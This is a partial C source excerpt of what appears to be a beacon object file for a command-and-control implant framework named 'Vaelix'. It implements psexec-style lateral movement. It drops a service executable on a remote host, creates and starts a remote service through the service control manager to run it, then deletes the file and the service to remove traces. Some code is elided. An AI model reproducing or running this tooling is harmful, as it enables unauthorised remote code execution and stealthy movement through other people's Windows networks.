...
/* Vaelix console output modes */ 
#define VAELIX_CONSOLE_GOOD 0x90
#define VAELIX_CONSOLE_INFO 0x91
#define VAELIX_CONSOLE_ERRO 0x92
...
VOID go( PVOID Buffer, ULONG Length )
{
    ...
    // BeaconPrintf( VAELIX_CONSOLE_GOOD, "Psexec [Host: %s] [SvcName: %s] [SvcPath: %s]", Host, SvcName, SvcPath );
    ...
    {
        BeaconPrintf( VAELIX_CONSOLE_ERRO, "CreateFileA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    if ( ! KERNEL32$WriteFile( hFile, SvcBinary, SvcBinarySize, &Written, NULL ) )
    {
        BeaconPrintf( VAELIX_CONSOLE_ERRO, "WriteFile Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
    }

    BeaconPrintf( VAELIX_CONSOLE_INFO, "Dropped service executable on %s at %s", Host, SvcPath );
    ...
    hSvcManager = ADVAPI32$OpenSCManagerA( Host, NULL, SC_MANAGER_ALL_ACCESS );
  	if ( ! hSvcManager ) 
    {
		BeaconPrintf( VAELIX_CONSOLE_ERRO, "OpenSCManagerA Failed: %d", KERNEL32$GetLastError() );
	    goto EXIT;
	}
	...
	if ( ! hSvcService ) 
    {
	    BeaconPrintf( VAELIX_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
        goto EXIT;
	}

    BeaconPrintf( VAELIX_CONSOLE_INFO, "Starting Service executable..." );
    ...
    BeaconPrintf( VAELIX_CONSOLE_INFO, "Successful started Service executable" );

    if ( ! KERNEL32$DeleteFileA( SvcPath ) )
        BeaconPrintf( VAELIX_CONSOLE_ERRO, "Failed to delete service executable %s from %s Error:[%d]", SvcPath, Host, KERNEL32$GetLastError() );
    else
        BeaconPrintf( VAELIX_CONSOLE_INFO, "Deleted service executable %s from %s", SvcPath, Host );
...
EXIT:
    ...
    if ( ! ADVAPI32$DeleteService( hSvcService ) ) 
		BeaconPrintf( VAELIX_CONSOLE_ERRO, "Failed to delete Service %s on %s: %d", SvcName, Host, KERNEL32$GetLastError() );
    ...
    if ( Success )
        BeaconPrintf( VAELIX_CONSOLE_GOOD, "psexec successful executed on %s", Host );
    else
        BeaconPrintf( VAELIX_CONSOLE_ERRO, "psexec failed to execut on %s", Host );
}
